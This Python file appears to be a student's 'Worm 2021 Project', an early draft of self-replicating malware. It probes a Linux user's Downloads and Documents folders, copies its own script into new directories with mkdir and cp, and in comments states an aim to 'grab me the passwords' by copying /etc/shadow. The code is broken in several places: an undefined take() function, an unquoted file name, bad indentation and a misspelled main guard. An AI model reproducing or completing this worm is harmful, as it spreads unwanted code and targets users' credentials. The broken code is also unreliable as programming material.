#The Beginning

# Worm 2021 Project By Mia Jenkins and Mentored by Deep Ramanayake

#import modules
import sys #allows for command line and creating files 
import os #allows us access for command line as well but more clear
import glob #helps with replication process and path finding 
import nmap #should allow me to pull from the nmap; may not use
import socket #should allow me to pull the ip address of the host machine of the virus
import platform #gives me system info
from sys import argv #uses arguments 
import subprocess #allows you to use terminal commands 

def wiggle():
    #the purpose of this function is to allow the worm to move and find files

    #first check the OS
    system = platform.system()

    #the computer is linux 
    if(system == "Linux"):
        #get the current location
        currentpath = os.path.abspath("worm.py")

        #need the username to properly get pathway names
        username = os.getlogin()

        #if the worm is in downloads
        if(os.path.isdir("/home/"+username+"/Downloads/")):
            take()
            copy()
           
            #should I send it to another location
        #if the worm is in Documents
         if(os.path.isdir("/home/"+username+"/Documents/")):
            take()
            copy()
           
        #if its not in any of those two locations this person is weird grab me the passwords
        else:
            #send the worm to the /etc and copy the shadow file but that may need addditional permissions
            #for right now just take whatever
            take()
            copy()

def copy():
    #going to copy the worm to the folder that it is currently in 

    #going to scan the folder to make sure it is not already copied
    os.path.exists("worm.py")

    #if it is in the directory
    if os.path.exists("worm.py"):
        print ("yes")

    else:
        #get the current location
        location = os.path.abspath(worm.py)

        #began the worm copy method
        script = argv

        #setting this to a name 
        name = str(script[0])

        #going to create the directory twice
        for i in range(0,1):
            directoryName = 'The Game' + str(i)
            subprocess.call(['mkdir', directoryName])
            subprocess.call(['cp',name, directoryName])

    



def main():
    wiggle()
    copy()
    take()

if __name__=="_main_":
    main()

# The End 